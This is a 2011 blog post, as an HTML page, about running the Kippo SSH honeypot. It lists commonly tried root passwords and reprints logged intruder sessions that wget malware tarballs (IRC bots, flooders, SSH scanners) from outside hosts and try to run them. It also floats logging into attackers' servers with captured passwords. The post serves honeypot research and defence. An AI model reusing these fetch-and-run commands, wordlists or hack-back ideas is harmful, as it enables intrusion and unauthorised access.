@@ -1,0 +1,1574 @@
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width" />
+
+	<title>Running A SSH Honeypot With Kippo: Let’s Catch Some Script Kiddies</title>
+
+	<link rel="stylesheet" href="http://blog.macuyiko.com/theme/css/normalize.css" />
+	<link rel="stylesheet" href="http://blog.macuyiko.com/theme/css/foundation.min.css" />
+	<link rel="stylesheet" href="http://blog.macuyiko.com/theme/css/style.css" />
+	<link rel="stylesheet" href="http://blog.macuyiko.com/theme/css/pygments.css" />	
+	<script src="http://blog.macuyiko.com/theme/js/jquery-2.0.3.min.js"></script>
+	<script src="http://blog.macuyiko.com/theme/js/custom.modernizr.js"></script>
+	<link href='http://fonts.googleapis.com/css?family=Roboto+Slab:400,700|Open+Sans|Source+Code+Pro:400,500' rel='stylesheet' type='text/css'>
+	
+	<script type="text/javascript">
+	var waitForFinalEvent = (function () {
+		var timers = {};
+		return function (callback, ms, uniqueId) {
+			if (!uniqueId) uniqueId = "_";
+			if (timers[uniqueId]) clearTimeout (timers[uniqueId]);
+			timers[uniqueId] = setTimeout(callback, ms);
+		};
+	})();
+	var insertCaptions = function() {
+		$('#articlecontainer .caption').remove();
+		var width = $(window).width();
+		var onmobile = width < 960; //>
+		var capclass = onmobile ? 'caption-below' : 'caption-aside';
+		$.each($('#articlecontainer img'), function(index, value) {
+			if ($(value).attr('alt') != undefined) {
+				var elem = $('<div class="caption '+capclass+'">'+$(value).attr('alt')+'</div>');
+				if (onmobile) elem.insertAfter(value);
+				else elem.insertBefore(value);
+			}
+		});
+	};
+	$(function() {
+		$(window).resize(function () {
+			waitForFinalEvent(function(){
+				insertCaptions();
+			}, 500, "window.resize");
+		});
+		insertCaptions();
+	});
+	</script>
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-60406-11']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+</head>
+
+<body>
+
+<nav>
+	<div class="top-bar large-12 columns">
+		<h1><a href="http://blog.macuyiko.com/">Bed Against The Wall</a></h1>
+	</div>
+</nav>
+
+
+<div class="row contentwrapper">
+	<div class="row">
+<div id="articlecontainer" class="large-9 columns large-centered">
+	<article>
+		<header>
+			<div class="article-info">do 10 maart 2011, by Seppe "Macuyiko" vanden Broucke</div>
+			<div class="article-title"><a href="http://blog.macuyiko.com/post/2011/running-a-ssh-honeypot-with-kippo-lets-catch-some-script-kiddies.html" rel="bookmark"
+			title="Permalink to Running A SSH Honeypot With Kippo: Let’s Catch Some Script Kiddies">Running A <span class="caps">SSH</span> Honeypot With Kippo: Let&#8217;s Catch Some Script&nbsp;Kiddies</a></div>
+		</header>
+	
+	    <h1>Introduction</h1>
+<p>While exploring <a href="http://www.fail2ban.org/">Fail2Ban</a> during one of my <a href="http://blog.macuyiko.com/2011/01/slowloris-and-mitigations-for-apache.html">previous posts</a>, it amazed me how many break-in attempts I received, trying to brute force passwords on the <span class="caps">SSH</span> daemon. To recap, Fail2Ban does&nbsp;this:</p>
+<blockquote>
+<p>Fail2ban scans log files like /var/log/pwdfail or /var/log/apache/error_log and bans <span class="caps">IP</span> that makes too many password failures. It updates firewall rules to reject the <span class="caps">IP</span> address.
+There are many articles (<a href="http://thinkhole.org/wp/2006/10/30/five-steps-to-a-more-secure-ssh/">this</a> is one of them) on the web which describe how you can harden your <span class="caps">SSH</span> server, like preventing root logins, to give an example. After getting one Fail2Ban warning after another, I decided to also move my <span class="caps">SSH</span> server to another port. And lo and behold, the attacks stopped almost completely. This is an example of security through obscurity, of course, but it shows that most of the attacks are performed by bots or script kiddies who don&#8217;t look further than port 22, so why not implement this simple chance.
+Of course, now port 22 was free to do something&nbsp;else&#8230;</p>
+</blockquote>
+<h1>Enter&nbsp;Kippo</h1>
+<p>Around this time (a few months ago), I also came across a program called <a href="http://code.google.com/p/kippo/">Kippo</a>:</p>
+<blockquote>
+<p>Kippo is a medium interaction <span class="caps">SSH</span> honeypot designed to log brute force attacks and, most importantly, the entire shell interaction performed by the attacker.
+Kippo is written in Python and pretty easy to install (the required dependencies are all listed on the homepage). The only thing which needs a bit of setting up is getting Kippo to listen to port 22 (we want our honeypot to catch as much as possible). <a href="http://code.google.com/p/kippo/wiki/MakingKippoReachable">This wiki page</a> describes how to do just that.
+Kippo does not need much <a href="http://code.google.com/p/kippo/wiki/KippoOnLinux">setting up</a>, and comes with a lot of Linux commands re-implemented (like wget, adduser, apt-get). The most important thing to do is to take look at <code>kippo.cfg</code> and to create the simulated file system using <code>utils/createfs.py</code>. You can also easily add other commands if you&#8217;re know what you&#8217;re doing (take a look in <code>txtcmds/</code> and <code>kippo/commands/</code>).
+After waiting for a week, I examined the logs to find out which passwords were used to try to login at the honeypot. By default, Kippo only comes with one root password it will accept (&#8220;123456&#8221;), but you can use the <code>utils/passdb.py</code> script to add more. I added these most commonly tried passwords:
+  - aditzul92
+  - admin1
+  - enter
+  - fuckoff
+  - god
+  - lacramioara
+  - letmein
+  - linux
+  - love
+  - passwd
+  - r00t
+  - rootroot
+  - secret
+  - sex
+  - snickhacklol123
+  - test
+  - 070790
+  - 123456
+  - 1q2wazsx
+  - administrator
+  - dragon
+  - fuck
+  - manager
+  - monkey
+  - p0p0c@t3p3tldiej
+  - password
+  - q1w2e3r4
+  - root1
+  - swordfish
+It&#8217;s well known that brute force programs use so called wordlists which contain the most common passwords to try and break in into a server. If you notice that one of your used passwords is present in the list above, I would strongly suggest to change it. Then, I&nbsp;waited&#8230;</p>
+</blockquote>
+<h1>A few months&nbsp;later</h1>
+<p>When looking at my logs now, I&#8217;ve had thousands of break-in attempts, hundreds of which &#8220;succeeded&#8221;. The interesting thing about Kippo is that it actually logs the shell session of the hacker. These shell sessions can be divided into three categories:
+  1. People who immediately leave once they&#8217;re logged in, probably to come back later or just take note that this server is indeed available.
+  2. People who do some basic fingerprinting of the server, using <code>w</code>, <code>/proc/cpuinfo</code>, <code>uptime</code> and <code>uname -a</code> to figure out the basics of the server. Most hackers also used <code>wget</code> to download a large file to test the download rate of the server. Funnily enough, this was almost always the Windows 2000 <span class="caps">SP3</span>. Probably because it&#8217;s (a) a large file and (b) hosted by a server you know is fast (Microsoft) and (c) is one of the few files on Microsoft&#8217;s website which is still hotlinkable.
+  3. People who performed some fingerprinting and proceeded to download and extract malware. Here Kippo intercepted the attempts to run executables and showed some bogus error messages, after which the hackers disconnected.
+Viewing the logs allows for some interesting observations:
+  - Most of the attempts aren&#8217;t thorough. Most hackers quickly move on when an attempt seems to fail.
+  - The tools used have been repacked and rewritten multiple times. Most of the tools are outdated, contain leftover files from previous installations or attempts, or contain weak attempts at automation shell scripts (with even sillier <span class="caps">ASCII</span> art).
+  - The main reasons for hacking a server seems to be: (a) installing tools to hack more servers, (b) installing hidden web servers, (c) installing <span class="caps">IRC</span> daemons or bouncers, (d) installing <span class="caps">IRC</span> bots. Surprisingly, almost none of the hackers tried to completely nuke the system.
+  - A few hackers spotted that a honeypot was in place. Most did not, despite the fact that Kippo is sometimes very blatant about this fact, by taunting with fake error messages.
+  - It seems that the hackers (I actually mean &#8220;script kiddies&#8221; whenever I say &#8220;hackers&#8221;) are following some kind of memorized script. Most of the attempts used to exact same fingerprinting and tried to execute the exact same tools. It makes one wonder if there&#8217;s a &#8220;<span class="caps">SSH</span> hacking school&#8221; out there somewhere. More realistically speaking, there probably is a &#8220;hacking tutorial&#8221; on a forum somewhere showing which commands you have to&nbsp;execute.</p>
+<h1>A look at some&nbsp;attempts</h1>
+<p>Let&#8217;s look at some of the shell sessions, shall we? I wanted to show an exact replay of the terminal sessions (like the demos on the <a href="http://code.google.com/p/kippo/">Kippo homepage</a>, but this proved to be too difficult. (Kippo&#8217;s log files are not easily read, and while I did code up a conversion tool and the basics of a Javascript replaying script, it under performed on browsers other than Chrome, and I decided it was not worth further&nbsp;effort).</p>
+<h2>First&nbsp;example</h2>
+<p>This attempt shows some of the basic fingerprinting performed by the hackers, and Kippo&#8217;s faked response. Afterwards, the hacker tries to download an <span class="caps">IRC</span> bot. Kippo taunts with an &#8220;O <span class="caps">RLY</span>&#8221; message.
+    server:~# w
+     23:40:45 up 14 days,  3:53,  1 user,  load average: 0.08, 0.02, 0.01
+    <span class="caps">USER</span>     <span class="caps">TTY</span>      <span class="caps">FROM</span>              <span class="caps">LOGIN</span>@   <span class="caps">IDLE</span>   <span class="caps">JCPU</span>   <span class="caps">PCPU</span> <span class="caps">WHAT</span>
+    root     pts/0    188.131.103.31    23:33    0.00s  0.00s  0.00s w
+    server:~# uptime
+     23:30:42 up 14 days,  3:53,  0 users,  load average: 0.08, 0.02, 0.01
+    server:~# cat /proc/cpuinfo
+    processor    : 0
+    vendor_id    : GenuineIntel
+    cpu family    : 6
+    model        : 23
+    model name    : Intel(R) Core(<span class="caps">TM</span>)2 Duo <span class="caps">CPU</span>     E8200  @ 2.66GHz
+    stepping    : 6
+    cpu MHz        : 2133.305
+    cache size    : 6144 <span class="caps">KB</span>
+    physical id    : 0
+    siblings    : 2
+    core id        : 0
+    cpu cores    : 2
+    apicid        : 0
+    initial apicid    : 0
+    fpu        : yes
+    fpu_exception    : yes
+    cpuid level    : 10
+    wp        : yes
+    flags        : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+    bogomips    : 4270.03
+    clflush size    : 64
+    cache_alignment    : 64
+    address sizes    : 36 bits physical, 48 bits virtual
+    power management:
+    processor    : 1
+    vendor_id    : GenuineIntel
+    cpu family    : 6
+    model        : 23
+    model name    : Intel(R) Core(<span class="caps">TM</span>)2 Duo <span class="caps">CPU</span>     E8200  @ 2.66GHz
+    stepping    : 6
+    cpu MHz        : 2133.305
+    cache size    : 6144 <span class="caps">KB</span>
+    physical id    : 0
+    siblings    : 2
+    core id        : 1
+    cpu cores    : 2
+    apicid        : 1
+    initial apicid    : 1
+    fpu        : yes
+    fpu_exception    : yes
+    cpuid level    : 10
+    wp        : yes
+    flags        : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+    bogomips    : 4266.61
+    clflush size    : 64
+    cache_alignment    : 64
+    address sizes    : 36 bits physical, 48 bits virtual
+    power management:<br />
+    server:~# uname -a
+    Linux server 2.6.26-2-686 #1 <span class="caps">SMP</span> Wed Nov 4 20:45:37 <span class="caps">UTC</span> 2009 i686 <span class="caps">GNU</span>/Linux
+    server:~# ls -a
+    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc <br />
+    server:~# ps x
+      <span class="caps">PID</span> <span class="caps">TTY</span>          <span class="caps">TIME</span> <span class="caps">CMD</span>
+     5673 pts/0    00:00:00 bash
+     5677 pts/0    00:00:00 ps x
+    server:~# wget http://download.microsoft.com/download/win2000platform/<span class="caps">SP</span>/<span class="caps">SP3</span>/<span class="caps">NT5</span>/<span class="caps">EN</span>-<span class="caps">US</span>/W2Ksp3.exe
+    &#8212;2011-01-26 23:31:12&#8212;  http://download.microsoft.com/download/win2000platform/<span class="caps">SP</span>/<span class="caps">SP3</span>/<span class="caps">NT5</span>/<span class="caps">EN</span>-<span class="caps">US</span>/W2Ksp3.exe
+    Connecting to download.microsoft.com:80&#8230; connected.
+    <span class="caps">HTTP</span> request sent, awaiting response&#8230; 200 <span class="caps">OK</span>
+    Length: 130978672 (124M) [application/octet-stream]
+    Saving to: <code>W2Ksp3.exe
+     7% [===&gt;                                   ] 10,422,763   1731K/s  eta 1m 9s^C
+    200 OK
+    server:~# rm -rf W2Ksp3.exe
+    server:~# wget http://eu-ro.ca/img.tar
+    --2011-01-26 23:31:31--  http://eu-ro.ca/img.tar
+    Connecting to eu-ro.ca:80... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 659886 (644K) [application/x-tar]
+    Saving to:</code>img.tar
+    100%[======================================&gt;] 659,886      219K/s  eta 0s<br />
+    2011-01-26 23:31:34 (219 <span class="caps">KB</span>/s) - `img.tar&#8217; saved [659886/659886]
+    server:~# tar zxvf img.tar
+    .img
+    .img/start
+    .img/run
+    .img/r
+    .img/r/rversions.e
+    .img/r/rtsay.e
+    .img/r/rsignoff.e
+    .img/r/rsay.e
+    .img/r/rpickup.e
+    .img/r/rnicks.e
+    .img/r/rkicks.e
+    .img/r/rinsult.e
+    .img/r/raway.e
+    .img/pico
+    .img/m.help
+    .img/inst
+    .img/bash
+    .img/autorun
+    .img
+    .img/start
+    .img/run
+    .img/r
+    .img/r/rversions.e
+    .img/r/rtsay.e
+    .img/r/rsignoff.e
+    .img/r/rsay.e
+    .img/r/rpickup.e
+    .img/r/rnicks.e
+    .img/r/rkicks.e
+    .img/r/rinsult.e
+    .img/r/raway.e
+    .img/pico
+    .img/m.help
+    .img/inst
+    .img/bash&nbsp;.img/autorun</p>
+<div class="highlight"><pre>server:~# cd .img
+server:/root/.img# chmod +x *
+server:/root/.img# ./start +s
+  ___ 
+ {o,o}
+ |)__)
+ -&quot;-&quot;-
+O RLY? cd
+  ___ 
+ {o,o}
+ |)__)
+ -&quot;-&quot;-
+O RLY? cd ..
+  ___ 
+ {o,o}
+ |)__)
+ -&quot;-&quot;-
+O RLY?
+</pre></div>
+
+
+<h2>Second&nbsp;example</h2>
+<p>Another one (I&#8217;ve removed the fingerprinting from now on). Here, <code>ftp</code>, <code>apt-get</code> and <code>yum</code> are tried before settling with <code>wget</code>. Another interesting thing to see here is that the tool is actually stored in what &#8220;looks&#8221; like an image file: <code>scanmorf.jpg</code>. Changing the extension is a tactic often used to upload files to web servers who only perform some basic filename checks. In this case, <code>root-arhive.do.am</code> might be an innocent, hacked website. The <code>pscan</code> tool used here will return often and is used to scan <span class="caps">IP</span> blocks for open <span class="caps">SSH</span> servers.
+    server:~# ftp zorro89.trei.ro
+    bash: ftp: command not found
+    server:~# apt-get
+    E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+    E: Unable to lock the list&nbsp;directory</p>
+<div class="highlight"><pre><span class="nt">server</span><span class="o">:~</span><span class="err">#</span> <span class="nt">yum</span>
+<span class="nt">bash</span><span class="o">:</span> <span class="nt">yum</span><span class="o">:</span> <span class="nt">command</span> <span class="nt">not</span> <span class="nt">found</span>
+<span class="nt">server</span><span class="o">:~</span><span class="err">#</span> <span class="nt">wget</span>
+<span class="nt">wget</span><span class="o">:</span> <span class="nt">missing</span> <span class="nt">URL</span>
+<span class="nt">Usage</span><span class="o">:</span> <span class="nt">wget</span> <span class="cp">[</span><span class="nb">OPTION</span><span class="cp">]</span><span class="o">...</span> <span class="cp">[</span><span class="nx">URL</span><span class="cp">]</span><span class="o">...</span>
+<span class="nt">Try</span> <span class="err">`</span><span class="nt">wget</span> <span class="nt">--help</span><span class="s1">&#39; for more options.</span>
+<span class="s1">server:~# http://root-arhive.do.am/scanner/scanmorf.jpg ; tar zxvf scanmorf.jpg ; cd .shm.xcgi?F6=1 ; chmod wget +x *</span>
+<span class="s1">--2011-01-26 23:53:38--  http://root-arhive.do.am/scanner/scanmorf.jpg</span>
+<span class="s1">Connecting to root-arhive.do.am:80... connected.</span>
+<span class="s1">HTTP request sent, awaiting response... 200 OK</span>
+<span class="s1">Length: 12466 (12K) </span><span class="cp">[</span><span class="nb">image</span><span class="p">/</span><span class="nx">jpeg</span><span class="cp">]</span><span class="s1"></span>
+<span class="s1">Saving to: `scanmorf.jpg</span>
+<span class="s1">100%</span><span class="cp">[</span><span class="o">======================================&gt;</span><span class="cp">]</span><span class="s1"> 12,466       2K/s  eta 4s    </span>
+<span class="s1">2011-01-26 23:53:38 (2 KB/s) - `scanmorf.jpg&#39;</span> <span class="nt">saved</span> <span class="cp">[</span><span class="mi">12466</span><span class="p">/</span><span class="nx">12466</span><span class="cp">]</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">12</span><span class="nc">.pscan.80</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">Horde</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">sd</span><span class="nc">.pscan.80</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">h</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">a</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">23</span><span class="nc">.pscan.80</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">paths</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">ps</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">a</span><span class="nc">.pl</span>
+<span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="o">/</span><span class="nt">scan</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">root</span><span class="o">/</span><span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="err">#</span> <span class="nt">ls</span>
+<span class="nt">12</span><span class="nc">.pscan.80</span> <span class="nt">Horde</span>       <span class="nt">sd</span><span class="nc">.pscan.80</span> <span class="nt">h</span>           <span class="nt">a</span>           <span class="nt">23</span><span class="nc">.pscan.80</span> <span class="nt">paths</span>       <span class="nt">ps</span>          <span class="nt">a</span><span class="nc">.pl</span>        <span class="nt">scan</span>        
+<span class="nt">server</span><span class="o">:/</span><span class="nt">root</span><span class="o">/</span><span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="err">#</span> <span class="nt">ls</span> <span class="nt">-all</span>
+<span class="nt">drwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>  <span class="nt">4096</span> <span class="nt">2011-01-26</span> <span class="nt">23</span><span class="nd">:53</span> <span class="o">.</span>
+<span class="nt">drwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>  <span class="nt">4096</span> <span class="nt">2011-01-26</span> <span class="nt">23</span><span class="nd">:53</span> <span class="o">..</span>
+<span class="nt">-rwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>     <span class="nt">0</span> <span class="nt">2011-01-22</span> <span class="nt">02</span><span class="nd">:25</span> <span class="nt">12</span><span class="nc">.pscan.80</span>
+<span class="nt">-rwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span> <span class="nt">14372</span> <span class="nt">2011-01-22</span> <span class="nt">02</span><span class="nd">:28</span> <span class="nt">Horde</span>
+<span class="nt">-rwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>  <span class="nt">9516</span> <span class="nt">2011-01-22</span> <span class="nt">02</span><span class="nd">:25</span> <span class="nt">sd</span><span class="nc">.pscan.80</span>
+<span class="nt">-rwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>  <span class="nt">2720</span> <span class="nt">2006-05-05</span> <span class="nt">15</span><span class="nd">:56</span> <span class="nt">h</span>
+<span class="nt">-rwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>    <span class="nt">23</span> <span class="nt">2006-05-05</span> <span class="nt">15</span><span class="nd">:55</span> <span class="nt">a</span>
+<span class="nt">-rw-r--r--</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>     <span class="nt">0</span> <span class="nt">2011-01-22</span> <span class="nt">02</span><span class="nd">:28</span> <span class="nt">23</span><span class="nc">.pscan.80</span>
+<span class="nt">-rwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>    <span class="nt">50</span> <span class="nt">2006-05-05</span> <span class="nt">15</span><span class="nd">:56</span> <span class="nt">paths</span>
+<span class="nt">-rwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span> <span class="nt">13432</span> <span class="nt">2011-01-22</span> <span class="nt">02</span><span class="nd">:28</span> <span class="nt">ps</span>
+<span class="nt">-rwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>  <span class="nt">1165</span> <span class="nt">2006-05-05</span> <span class="nt">15</span><span class="nd">:56</span> <span class="nt">a</span><span class="nc">.pl</span>
+<span class="nt">-rwxr-xr-x</span> <span class="nt">1</span> <span class="nt">root</span> <span class="nt">root</span>   <span class="nt">857</span> <span class="nt">2011-01-22</span> <span class="nt">02</span><span class="nd">:28</span> <span class="nt">scan</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">root</span><span class="o">/</span><span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="err">#</span> <span class="o">./</span><span class="nt">scan</span> <span class="nt">88</span><span class="nc">.198</span>
+  <span class="nt">___</span> 
+ <span class="p">{</span><span class="n">o</span><span class="o">,</span><span class="n">o</span><span class="p">}</span>
+ <span class="o">|)</span><span class="nt">__</span><span class="o">)</span>
+ <span class="nt">-</span><span class="s2">&quot;-&quot;</span><span class="nt">-</span>
+<span class="nt">O</span> <span class="nt">RLY</span><span class="o">?</span> <span class="nt">y</span>
+  <span class="nt">___</span>
+ <span class="p">{</span><span class="n">o</span><span class="o">,</span><span class="n">o</span><span class="p">}</span>
+ <span class="o">(</span><span class="nt">__</span><span class="o">(|</span>
+ <span class="nt">-</span><span class="s2">&quot;-&quot;</span><span class="nt">-</span>
+<span class="nt">NO</span> <span class="nt">WAI</span><span class="o">!</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">root</span><span class="o">/</span><span class="nc">.shm.xcgi</span><span class="o">?</span><span class="nt">F6</span><span class="o">=</span><span class="nt">1</span><span class="err">#</span> <span class="o">./</span><span class="nt">a</span> <span class="nt">88</span><span class="nc">.198</span>
+<span class="nt">error</span> <span class="nt">while</span> <span class="nt">loading</span> <span class="nt">shared</span> <span class="nt">libraries</span><span class="o">:</span> <span class="nt">libgnome</span><span class="nc">.so.32</span><span class="o">:</span> <span class="nt">cannot</span> <span class="nt">open</span> <span class="nt">shared</span> <span class="nt">object</span> <span class="nt">file</span><span class="o">:</span> <span class="nt">No</span> <span class="nt">such</span> <span class="nt">file</span> <span class="nt">or</span> <span class="nt">directory</span>
+</pre></div>
+
+
+<h2>Third&nbsp;example</h2>
+<p>Some intruders are friendly enough to change the root password for us. This would actually be an interesting concept to add to Kippo: when you notice a <code>passwd</code> command being executed, try to set up a reverse <span class="caps">SSH</span> connection to the attacker (probably possible since the attackers often use hacked servers themselves) and login with that password. When the same password is used during each hack attempt, we would probably be able to reclaim the originating server. Two tools are downloaded here. One is a flooding <span class="caps">IRC</span> bot, the other is a rehash of the <code>pscan</code> tool from above, with some automation shell scripts added (dubbed <code>gosh</code> here). It&#8217;s also interesting to note that most of the hackers try to cover their tracks by removing their downloads.
+    server:~# w
+     23:35:44 up 14 days,  3:53,  1 user,  load average: 0.08, 0.02, 0.01
+    <span class="caps">USER</span>     <span class="caps">TTY</span>      <span class="caps">FROM</span>              <span class="caps">LOGIN</span>@   <span class="caps">IDLE</span>   <span class="caps">JCPU</span>   <span class="caps">PCPU</span> <span class="caps">WHAT</span>
+    root     pts/0    82.57.163.232     23:35    0.00s  0.00s  0.00s w
+    server:~# passwd
+    Enter new <span class="caps">UNIX</span> password: 
+    Retype new <span class="caps">UNIX</span> password: 
+    passwd: password updated successfully
+    server:~# cd ..
+    server:/# cd var 
+    server:/var# cd tmp
+    server:/var/tmp# ls
+    server:/var/tmp# wget http://www.denysa.net/denysa/flood.tgz
+    &#8212;2011-01-26 23:36:24&#8212;  http://www.denysa.net/denysa/flood.tgz
+    Connecting to www.denysa.net:80&#8230; connected.
+    <span class="caps">HTTP</span> request sent, awaiting response&#8230; 200 <span class="caps">OK</span>
+    Length: 227324 (221K) [application/x-compressed]
+    Saving to: <code>flood.tgz
+    100%[======================================&gt;] 227,324      51K/s  eta 2s   
+    2011-01-26 23:36:26 (51 KB/s) -</code>flood.tgz&#8217; saved&nbsp;[227324/227324]</p>
+<div class="highlight"><pre>server:/var/tmp# wget http://gblteam.webs.com/gosh.tgz.tar
+--2011-01-26 23:36:44--  http://gblteam.webs.com/gosh.tgz.tar
+Connecting to gblteam.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1642769 (1M) [application/x-tar]
+Saving to: `gosh.tgz.tar
+100%[======================================&gt;] 1,642,769    658K/s  eta 0s   
+2011-01-26 23:36:46 (658 KB/s) - `gosh.tgz.tar&#39; saved [1642769/1642769]
+server:/var/tmp# tar zxvf gosh.tgz.tar
+gosh
+gosh/3
+gosh/4
+gosh/common
+gosh/go.sh
+gosh/scam
+gosh/pscan2
+gosh/ss
+gosh/5
+gosh/vuln.txt
+gosh/1
+gosh/mfu.txt
+gosh/pass_file
+gosh/gen-pass.sh
+gosh/secure
+gosh/2
+gosh/ssh-scan
+gosh/a
+server:/var/tmp# cd gosh
+server:/var/tmp/gosh# ls
+3           4           common      go.sh       scam        pscan2      
+ss          5           vuln.txt    1           mfu.txt     pass_file   
+gen-pass.sh secure      2           ssh-scan    a           
+server:/var/tmp/gosh# touch bios.txt
+server:/var/tmp/gosh# chmod +x *
+server:/var/tmp/gosh# ./go.sh 114
+  ___ 
+ {o,o}
+ |)__)
+ -&quot;-&quot;-
+O RLY? y
+  ___
+ {o,o}
+ (__(|
+ -&quot;-&quot;-
+NO WAI!
+server:/var/tmp/gosh# cd ..
+server:/var/tmp# rm -rf gosh
+server:/var/tmp# ls
+flood.tgz    gosh.tgz.tar 
+server:/var/tmp# tar zxvf flood.tgz
+f
+f/1
+f/P&amp;u÷
+f/P¦u÷
+f/b
+f/b2
+f/bang.txt
+f/f
+f/f4
+f/fwd
+f/hide
+f/httpd
+f/j
+f/j2
+f/mech.help
+f/mech.set
+f/s
+f/sl
+f/start.sh
+f/std
+f/stream
+f/tty
+f/v
+f/v2
+f/x
+server:/var/tmp# cd f
+server:/var/tmp/f# rm -rf f
+server:/var/tmp/f# ls
+1         P&amp;u÷   P¦u÷  b         b2        bang.txt  f4        fwd       
+hide      httpd     j         j2        mech.help mech.set  s         sl        
+start.sh  std       stream    tty       v         v2        x         
+server:/var/tmp/f# ./httpd
+unable to open display &quot;:0&quot;
+server:/var/tmp/f# chmod +x *
+server:/var/tmp/f# ./httpd
+unable to open display &quot;:0&quot;
+server:/var/tmp/f# cd..
+bash: cd..: command not found
+server:/var/tmp/f# cd ..
+server:/var/tmp# rm -rf f
+server:/var/tmp# ls
+flood.tgz    gosh.tgz.tar 
+server:/var/tmp# rm -rf flood.tgz
+server:/var/tmp# rm -rf gosh.tgz.tar93
+</pre></div>
+
+
+<h2>Fourth&nbsp;example</h2>
+<p>Another attempt. Checking out the website http://eu-ro.ca/ reveals what seems to be a Romanian hacker group/set-up. Peeking in the bot configuration often reveals obscure <span class="caps">IRC</span> channels on Undernet. Following these channels quickly leads you to a whole set-up of channels, bots, and hackers. If you manage to lay low there, you can gain a lot of info (bot commands, group leaders, group set-up, targets and so on), but be prepared for some bans and insults as well. If I had some more spare time, I would set up a few dedicated honeypots (with more advanced shell simulation) and try to uncover more.
+    server:~# mkdir /tmp/.user
+    server:~# cd /tmp/.user
+    server:/tmp/.user# wget http://eu-ro.ca/.kde.tgz
+    &#8212;2011-01-26 23:46:15&#8212;  http://eu-ro.ca/.kde.tgz
+    Connecting to eu-ro.ca:80&#8230; connected.
+    <span class="caps">HTTP</span> request sent, awaiting response&#8230; 200 <span class="caps">OK</span>
+    Length: 1238822 (1M) [application/x-gzip]
+    Saving to: <code>.kde.tgz
+    100%[======================================&gt;] 1,238,822    327K/s  eta 0s   
+    2011-01-26 23:46:19 (327 KB/s) -</code>.kde.tgz&#8217; saved [1238822/1238822]
+    server:/tmp/.user# tar zxvf .kde.tgz
+    .kde
+    .kde/pass_filees
+    .kde/pscan2
+    .kde/a1
+    .kde/common
+    .kde/pass_file
+    .kde/ssh-scan
+    .kde/auto
+    .kde/ss
+    .kde/go.sh
+    .kde/a
+    .kde/gen-pass.sh
+    .kde/start
+    .kde/vuln.txt
+    .kde
+    .kde/pass_filees
+    .kde/pscan2
+    .kde/a1
+    .kde/common
+    .kde/pass_file
+    .kde/ssh-scan
+    .kde/auto
+    .kde/ss
+    .kde/go.sh
+    .kde/a
